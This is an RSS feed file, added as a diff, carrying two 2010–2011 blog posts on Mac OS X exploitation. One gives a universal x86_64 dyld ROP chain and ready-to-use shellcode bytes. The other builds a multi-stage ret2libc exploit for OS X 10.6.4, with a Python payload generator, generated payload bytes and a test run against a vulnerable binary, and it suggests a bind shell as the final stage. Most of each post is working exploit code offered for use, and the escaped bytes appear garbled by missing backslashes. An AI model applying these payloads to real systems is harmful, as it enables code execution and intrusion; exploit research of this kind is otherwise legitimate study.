@@ -1,0 +1,295 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<channel>
+   
+   	<title>RealJenius.com - Tag: OSX</title>
+   
+   <link>http://realjenius.com</link>
+   <description>I'm a software developer in the game industry, and have been (for better or worse) coding on the Java platform for the last decade. I also do all my own stunts.</description>
+   <language>en-us</language>
+   <managingEditor>R.J. Lorimer</managingEditor>
+   <atom:link href="rss" rel="self" type="application/rss+xml" />
+   
+	<item>
+  <title>Yet another universal OSX x86_64 dyld ROP shellcode</title>
+  <link>http://realjenius.com/research/2011/07/30/yet-another-universal-osx-x86_64-dyld-rop-shellcode.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2011-07-30T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/research/2011/07/30/yet-another-universal-osx-x86_64-dyld-rop-shellcode.html</guid>
+  <description><![CDATA[
+     <p>This technique was killed by OSX Lion 10.7 with full ASLR. @pa_kt has posted an <a href="http://gdtr.wordpress.com/2011/07/23/universal-rop-shellcode-for-os-x-x64/">Universal ROP shellcode for OS X x64</a> with detail steps and explanation. If you don’t have a chance to read above post, the basic ideas are:</p>
+
+<ul>
+  <li>Copy stubcode to a writable area (.data section)</li>
+  <li>Make that area RWX</li>
+  <li>Jump to RWX area and execute stubcode</li>
+  <li>Stubcode will transfer normal shellcode to RWX area and execute it</li>
+  <li>All the ROP gadgets are from dyld module which is not randomized</li>
+</ul>
+
+<p>In this post, we shows another OSX x86_64 dyld ROP shellcode which is more simple. We employ the same ideas with some minor differences in implementation:</p>
+
+<ul>
+  <li>Instead of using long gadgets with “leave”, we use direct, short gadgets from unintended code</li>
+  <li>Calling mprotect() via syscall</li>
+  <li>Short stubcode (7 bytes) using memcpy() to transfer payload</li>
+</ul>
+
+<p>Here is the ROP shellcode with explanation:</p>
+
+<pre class="brush: plain; title: ; notranslate" title=""># store [target], stubcode
+0x00007fff5fc0e7ee # pop rsi ; adc al 0x83
+0xc353575e545a5b90 # =&gt; rsi = stubcode
+0x00007fff5fc24cdc # pop rdi
+0x00007fff5fc74f80 # =&gt; rdi
+0x00007fff5fc24d26 # mov [rdi+0x80] rsi; stubcode =&gt; [target]
+# load rdx, 0x7 (prot RWX)
+0x00007fff5fc24cdc # pop rdi
+0x00007fff5fc75001 # =&gt; rdi
+0x00007fff5fc1ddc0 # lea rax, [rdi-0x1]
+0x00007fff5fc219c3 # pop rbp ; add [rax] al ; add cl cl
+0x00007fff5fc75000 # =&gt; rbp
+0x00007fff5fc0e7ee # pop rsi ; adc al 0x83
+0x0000000000000007 # =&gt; rsi
+0x00007fff5fc14149 # mov edx esi ; add [rax] al ; add [rbp+0x39] cl =&gt; rdx = 0x7
+# load rsi, 4096 (size)
+0x00007fff5fc0e7ee # pop rsi ; adc al 0x83
+0x0000000000001000 # =&gt; rsi = 4096
+# load rax, mprotect_syscal
+0x00007fff5fc24cdc # pop rdi
+0x000000000200004b # =&gt; rdi
+0x00007fff5fc1ddc0 # lea rax, [rdi-0x1] =&gt; rax = 0x200004a (mprotect syscall)
+# load rdi, target
+0x00007fff5fc24cdc # pop rdi
+0x00007fff5fc75000 # =&gt; rdi = target
+# syscall
+0x00007fff5fc1c76d # mov r10, rcx; syscall  =&gt; mprotect(target, 4096, 7)
+0x00007fff5fc75000 # jump to target, execute stubcode
+# stubcode
+# 5B                pop rbx     # rbx -&gt; memcpy()
+# 5A                pop rdx     # rdx -&gt; size
+# 54                push rsp    # src -&gt; &amp;shellcode
+# 5E                pop rsi     # src -&gt; &amp;shellcode
+# 57                push rdi    # jump to target when return from memcpy()
+# 53                push rbx    # memcpy()
+# C3                ret         # execute memcpy(target, &amp;shellcode, size)
+0x00007fff5fc234f0 # &amp;memcpy()
+0x0000000000000200 # shellcode size = 512
+&lt;your shellcode here&gt;
+</pre>
+
+<p>You can verify those gadgets and find more here: <a href="http://goo.gl/p35vY">http://goo.gl/p35vY</a></p>
+
+<p>Ready to use shellcode:</p>
+
+<pre class="brush: plain; title: ; notranslate" title="">"xeexe7xc0x5fxffx7fx00x00x90x5bx5ax54x5ex57x53xc3"
+"xdcx4cxc2x5fxffx7fx00x00x80x4fxc7x5fxffx7fx00x00"
+"x26x4dxc2x5fxffx7fx00x00xdcx4cxc2x5fxffx7fx00x00"
+"x01x50xc7x5fxffx7fx00x00xc0xddxc1x5fxffx7fx00x00"
+"xc3x19xc2x5fxffx7fx00x00x00x50xc7x5fxffx7fx00x00"
+"xeexe7xc0x5fxffx7fx00x00x07x00x00x00x00x00x00x00"
+"x49x41xc1x5fxffx7fx00x00xeexe7xc0x5fxffx7fx00x00"
+"x00x10x00x00x00x00x00x00xdcx4cxc2x5fxffx7fx00x00"
+"x4bx00x00x02x00x00x00x00xc0xddxc1x5fxffx7fx00x00"
+"xdcx4cxc2x5fxffx7fx00x00x00x50xc7x5fxffx7fx00x00"
+"x6dxc7xc1x5fxffx7fx00x00x00x50xc7x5fxffx7fx00x00"
+"xf0x34xc2x5fxffx7fx00x00x00x02x00x00x00x00x00x00"
+</pre>
+
+  ]]></description>
+</item>
+
+	<item>
+  <title>Simple Mac OS X ret2libc exploit (x86)</title>
+  <link>http://realjenius.com/research/2010/10/05/simple-mac-os-x-ret2libc-exploit-x86.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2010-10-05T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/research/2010/10/05/simple-mac-os-x-ret2libc-exploit-x86.html</guid>
+  <description><![CDATA[
+     <p>Talking about buffer overflow exploit on x86, Mac OS X is the most easy and hacker friendly target compare to Linux or Windows. OS X always loads **/usr/lib/dyld **at a fixed location and it contains a lot of helper stubs to launch the exploit. If you want something advanced likes ROP (Return-Oriented-Programming) exploit you may have a look at “<a href="http://trailofbits.com/2010/07/21/mac-os-x-return-oriented-exploitation/" target="_blank">Mac OS X Return-Oriented Exploitation</a>” and thorough step-by-step guide “<a href="http://www.exploit-db.com/osx-rop-exploits-evocam-case-study/" target="_blank">OSX ROP Exploit – EvoCam Case Study</a>“. But actually, we don’t need ROP for 32-bit exploitation on OS X, simple ret2libc is enough and straightforward to implement. Let take a look at multi-stage ret2libc exploit on OS X.</p>
+
+<h2 id="the-target">The target</h2>
+
+<p>Under OSX, dyld is always loaded at a fixed location with __IMPORT page is RWX as shown below:</p>
+
+<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
+  #__TEXT                 8fe00000-8fe0b000 [   44K] r-x/rwx SM=COW  /usr/lib/dyld
+</div>
+
+<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
+  #__TEXT                 8fe0b000-8fe0c000 [    4K] r-x/rwx SM=PRV  /usr/lib/dyld
+</div>
+
+<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
+  #__TEXT                 8fe0c000-8fe42000 [  216K] r-x/rwx SM=COW  /usr/lib/dyld
+</div>
+
+<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
+  #__LINKEDIT             8fe70000-8fe84000 [   80K] r&#8211;/rwx SM=COW  /usr/lib/dyld
+</div>
+
+<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
+  #__DATA                 8fe42000-8fe44000 [    8K] rw-/rwx SM=PRV  /usr/lib/dyld
+</div>
+
+<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
+  #__DATA                 8fe44000-8fe6f000 [  172K] rw-/rwx SM=COW  /usr/lib/dyld
+</div>
+
+<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
+  #__IMPORT               8fe6f000-8fe70000 [    4K] rwx/rwx SM=COW  /usr/lib/dyld
+</div>
+
+<pre><strong>__TEXT                 8fe00000-8fe0b000 [   44K] r-x/rwx SM=COW  /usr/lib/dyld</strong>
+__TEXT                 8fe0b000-8fe0c000 [    4K] r-x/rwx SM=PRV  /usr/lib/dyld
+__TEXT                 8fe0c000-8fe42000 [  216K] r-x/rwx SM=COW  /usr/lib/dyld
+__LINKEDIT             8fe70000-8fe84000 [   80K] r--/rwx SM=COW  /usr/lib/dyld
+__DATA                 8fe42000-8fe44000 [    8K] rw-/rwx SM=PRV  /usr/lib/dyld
+__DATA                 8fe44000-8fe6f000 [  172K] rw-/rwx SM=COW  /usr/lib/dyld
+<strong>__IMPORT               8fe6f000-8fe70000 [    4K] rwx/rwx SM=COW  /usr/lib/dyld</strong></pre>
+
+<p><span style="font-family: Georgia, 'Times New Roman', 'Bitstream Charter', Times, serif;line-height: 19px;font-size: 13px">Our target is to transfer the desired shellcode to the __IMPORT section of dyld then execute it. We can simply do this with byte-per-byte copy way of <a href="http://www.vnsecurity.net/2010/08/ropeme-rop-exploit-made-easy/">ROPEME</a>. There is some disadvantages with this method:</span></p>
+
+<p><span style="font-family: Georgia, 'Times New Roman', 'Bitstream Charter', Times, serif;line-height: 19px;font-size: 13px"> </span></p>
+
+<ul>
+  <li>Payload size is large, around 10 times of actual shellcode</li>
+  <li>We have to re-generate the whole payload when changing to new shellcode</li>
+</ul>
+
+<p>With OS X we can do it better as there is a RWX page at static location.</p>
+
+<h2 id="staging-payload">Staging payload</h2>
+
+<p>The most complicated part of ROP technique is “stack pivoting” or ESP register control under ASLR. By executing a small shellcode we can take ESP under control easily. Our multi-stage payload will look like:</p>
+
+<h3 id="stage-2-actual-shellcode">Stage-2: actual shellcode</h3>
+
+<p>This is the last stage in our multi-stage payload. Any NULL-free shellcode can be used, e.g bind shell code from Metasploit.</p>
+
+<h3 id="stage-1-shellcode-loader-for-stage-2-payload">Stage-1: shellcode loader for stage-2 payload</h3>
+
+<p>This stage will transfer stage-2 payload on stack to __IMPORT section (RWX) of dyld then executes it. The transfer function is *_strcpy() *in dyld. Below small shellcode will be executed on RWX page to perform the job:</p>
+
+<pre># 58                pop eax     # eax -&gt; TARGET
+# 5B                pop ebx     # ebx -&gt; STRCPY
+# 54                push esp    # src -&gt; &amp;shellcode
+# 50                push eax    # dst -&gt; TARGET
+# 50                push eax    # jump to TARGET when return from _strcpy()
+# 53                push ebx    # STRCPY
+# C3                ret         # execute _strcpy(TARGET, &amp;shellcode)</pre>
+
+<h3 id="stage-0-ret2libc-loader-for-stage-1-payload">Stage-0: ret2libc loader for stage-1 payload</h3>
+
+<p>This stage will transfer 7 bytes of stage-1 payload to our RWX location using repeated *_strcpy() *calls, then executes it. We lookups the dyld for necessary byte values and copy it to the target byte-per-byte.</p>
+
+<p>In summary, there is some advantages with our multi-stage payload:</p>
+
+<ul>
+  <li>Straightforward to implement: only ret2libc calls, no gadget is required</li>
+  <li>Payload size overhead is small: around 100 bytes</li>
+  <li>Independent, generic loader code: no need to regenerate the whole payload, just append a new shellcode to make new payload</li>
+</ul>
+
+<h2 id="automated-payload-generator">Automated payload generator</h2>
+
+<p>Let put all this together and make an automated payload generator in Python.</p>
+
+<ul>
+  <li>Select the target</li>
+</ul>
+
+<pre class="brush: python; title: ; notranslate" title="">#__IMPORT               8fe6f000-8fe70000 [    4K] rwx/rwx SM=COW  /usr/lib/dyld
+TARGET = 0x8fe6f010 # to avoid NULL byte
+# dyld base address
+DYLDADDR = 0x8fe00000
+</pre>
+
+<ul>
+  <li>Extract dyld’s i386 code</li>
+</ul>
+
+<pre class="brush: python; title: ; notranslate" title=""># $ otool -f /usr/lib/dyld
+# ...
+#architecture 1
+#    cputype 7
+#    cpusubtype 3
+#    capabilities 0x0
+#    offset 352256
+#    size 368080
+#    align 2^12 (4096)
+# ...
+
+DYLDFILE = "/usr/lib/dyld"
+DYLDCODE = open(DYLDFILE, "rb").read()
+DYLDCODE = DYLDCODE[352256 : 352256+368080]
+</pre>
+
+<ul>
+  <li>_strcpy() call</li>
+</ul>
+
+<pre class="brush: python; title: ; notranslate" title=""># $ nm -arch i386 /usr/lib/dyld | grep _strcpy
+# 8fe2db10 t _strcpy
+STRCPY = 0x8fe2db10
+
+# $ otool -arch i386 -tv /usr/lib/dyld | grep pop -A2 | grep ret -B1 | grep pop
+# 8fe28790        popl    %edi
+# 8fe2b3d4        popl    %edi
+POP2RET = 0x8fe2878f
+</pre>
+
+<ul>
+  <li>stage-1</li>
+</ul>
+
+<pre class="brush: python; title: ; notranslate" title=""># stage1
+# 58                pop eax     # eax -&gt; TARGET
+# 5B                pop ebx     # ebx -&gt; STRCPY
+# 54                push esp    # dst -&gt; &amp;shellcode
+# 50                push eax    # src -&gt; TARGET
+# 50                push eax    # jump to TARGET when return from _strcpy()
+# 53                push ebx    # STRCPY
+# C3                ret         # execute _strcpy(TARGET, &amp;shellcode)
+
+STAGE1 = "x58x5bx54x50x50x53xc3"
+</pre>
+
+<ul>
+  <li>stage-0</li>
+</ul>
+
+<pre class="brush: python; title: ; notranslate" title=""># stage0: _strcpy sequences
+STAGE0 = gen_stage0(DYLDCODE, STAGE1)
+</pre>
+
+<p>Below is the stage-0 payload loader generated for OS X 10.6.4:</p>
+
+<pre class="brush: python; title: ; notranslate" title="">STAGE0 = (  "x10xdbxe2x8fx8fx87xe2x8fx10xf0xe6x8fx31x24xe1x8f"
+            "x10xdbxe2x8fx8fx87xe2x8fx12xf0xe6x8fx32x01xe0x8f"
+            "x10xdbxe2x8fx8fx87xe2x8fx13xf0xe6x8fx7ex21xe1x8f"
+            "x10xdbxe2x8fx8fx87xe2x8fx15xf0xe6x8fx45x10xe0x8f"
+            "x10xdbxe2x8fx8fx87xe2x8fx16xf0xe6x8fx44x10xe0x8f"
+            "x10xf0xe6x8fx10xf0xe6x8fx10xdbxe2x8f" )
+</pre>
+
+<p>Test the payload with simple buffer overflow:</p>
+
+<pre class="brush: plain; title: ; notranslate" title="">bash-3.2$ ./vuln "`python -c 'print "A"*272 + "x10xdbxe2x8fx8fx87xe2x8fx10xf0xe6x8fx31x24xe1x8fx10xdbxe2x8fx8fx87xe2x8fx12xf0xe6x8fx32x01xe0x8fx10xdbxe2x8fx8fx87xe2x8fx13xf0xe6x8fx7ex21xe1x8fx10xdbxe2x8fx8fx87xe2x8fx15xf0xe6x8fx45x10xe0x8fx10xdbxe2x8fx8fx87xe2x8fx16xf0xe6x8fx44x10xe0x8fx10xf0xe6x8fx10xf0xe6x8fx10xdbxe2x8f" + "xcc"*4'`
+
+...
+
+Trace/BPT trap
+
+bash-3.2$
+
+</pre>
+
+<p>Looking for the next? Maybe “Mac OS X ROP exploit on x86_64″ someday.</p>
+
+  ]]></description>
+</item>
+
+</channel>
+</rss>
